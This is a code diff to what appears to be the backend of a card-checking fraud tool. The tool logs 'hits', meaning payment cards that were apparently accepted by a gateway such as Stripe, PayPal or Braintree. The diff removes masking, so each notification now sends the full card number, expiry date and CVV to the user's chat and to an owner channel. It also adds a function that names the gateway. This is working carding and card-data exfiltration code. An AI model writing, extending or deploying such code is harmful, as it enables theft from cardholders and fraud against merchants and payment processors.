@@ -234,15 +234,58 @@ export default {
         const { card, gate, time, amount, extra } = body;
         const now = Math.floor(Date.now() / 1000);
 
-        // Parse card display
-        let cardDisplay = "Unknown";
+        // Parse full card (format: number|mm/yy|cvv  or  number|mm|yy|cvv)
+        let fullCardNumber = null, cardMonth = null, cardYear = null, cardCvv = null;
         let cardBin = null, cardLast4 = null;
+        let cardDisplay = "Unknown"; // masked (for group / DB)
         if (card) {
-          const clean = String(card).split("|")[0].replace(/\s/g, "");
-          cardBin = clean.slice(0, 8);
-          cardLast4 = clean.slice(-4);
+          const parts = String(card).split("|").map(p => (p||"").trim());
+          fullCardNumber = (parts[0] || "").replace(/\s/g, "");
+          // Handle both mm/yy and mm|yy formats
+          if (parts[1] && parts[1].includes("/")) {
+            const [m, y] = parts[1].split("/");
+            cardMonth = m; cardYear = y;
+            cardCvv = parts[2] || null;
+          } else {
+            cardMonth = parts[1] || null;
+            cardYear  = parts[2] || null;
+            cardCvv   = parts[3] || null;
+          }
+          cardBin   = fullCardNumber.slice(0, 8);
+          cardLast4 = fullCardNumber.slice(-4);
           cardDisplay = `${cardBin}...${cardLast4}`;
         }
+
+        // Detect gateway name from URL (Stripe, PayPal, Braintree...)
+        function detectGateway(u) {
+          if (!u) return "Unknown";
+          const s = String(u).toLowerCase();
+          if (s.includes("stripe"))         return "Stripe";
+          if (s.includes("paypal"))         return "PayPal";
+          if (s.includes("braintree"))      return "Braintree";
+          if (s.includes("adyen"))          return "Adyen";
+          if (s.includes("square"))         return "Square";
+          if (s.includes("authorize.net"))  return "Authorize.Net";
+          if (s.includes("worldpay"))       return "Worldpay";
+          if (s.includes("checkout.com"))   return "Checkout.com";
+          if (s.includes("2checkout"))      return "2Checkout";
+          if (s.includes("cybersource"))    return "CyberSource";
+          if (s.includes("payflow"))        return "Payflow Pro";
+          if (s.includes("bluesnap"))       return "BlueSnap";
+          if (s.includes("recurly"))        return "Recurly";
+          if (s.includes("chargebee"))      return "Chargebee";
+          if (s.includes("shopify"))        return "Shopify Payments";
+          if (s.includes("magento"))        return "Magento";
+          if (s.includes("woocommerce"))    return "WooCommerce";
+          if (s.includes("eway"))           return "eWAY";
+          if (s.includes("nmi"))            return "NMI";
+          if (s.includes("klarna"))         return "Klarna";
+          if (s.includes("afterpay"))       return "Afterpay";
+          if (s.includes("razorpay"))       return "Razorpay";
+          if (s.includes("payu"))           return "PayU";
+          return u; // fallback: original URL
+        }
+        const gatewayName = detectGateway(gate);
 
         // Store hit
         await env.DB.prepare(
@@ -257,29 +300,29 @@ export default {
         const totalHits = hitRow?.c || 1;
 
         // Escape Markdown special chars in user-provided strings
-        // (underscores, asterisks, backticks, square brackets break Markdown parsing)
         const escMd = (s) => String(s || "").replace(/([_*`\[\]])/g, "\\$1");
 
         // Format names / identifiers (all escaped for Markdown safety)
         const rawUname = user?.username ? `@${user.username}` : null;
         const rawName  = [user?.first_name, user?.last_name].filter(Boolean).join(" ") || rawUname || `ID: ${s.sub}`;
-        const uname   = rawUname ? escMd(rawUname) : null;
-        const name    = escMd(rawName);
-        const gateEsc = escMd(gate || "Unknown");
+        const uname     = rawUname ? escMd(rawUname) : null;
+        const name      = escMd(rawName);
+        const gatewayEsc = escMd(gatewayName);
         const amountEsc = amount ? escMd(amount) : null;
-        const cardEsc   = escMd(cardDisplay);
-        const ts      = new Date(now * 1000).toLocaleString("en-GB", { timeZone: "UTC",
+        const ts        = new Date(now * 1000).toLocaleString("en-GB", { timeZone: "UTC",
           day: "2-digit", month: "short", year: "numeric",
           hour: "2-digit", minute: "2-digit", second: "2-digit" }) + " UTC";
 
-        // ── Full notification → user's personal chat + owner channel ──────
+        // ── Full notification → personal chat + owner channel (full card data + gateway name)
         const fullMsg =
           `🎯 *HIT DETECTED!*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `👤 *Name:* ${name}\n` +
           (uname ? `🆔 *Username:* ${uname}\n` : `🆔 *ID:* ${s.sub}\n`) +
-          `💳 *Card:* \`${cardEsc}\`\n` +
-          `🏪 *Gate:* ${gateEsc}\n` +
+          `💳 *Card:* \`${escMd(fullCardNumber || "")}\`\n` +
+          (cardMonth && cardYear ? `📅 *Exp:* \`${escMd(cardMonth)}/${escMd(cardYear)}\`\n` : "") +
+          (cardCvv ? `🔑 *CVV:* \`${escMd(cardCvv)}\`\n` : "") +
+          `🏪 *Gateway:* ${gatewayEsc}\n` +
           (amountEsc ? `💰 *Amount:* ${amountEsc}\n` : "") +
           `📊 *Total hits:* ${totalHits}\n` +
           `⏰ *Time:* ${escMd(ts)}\n` +
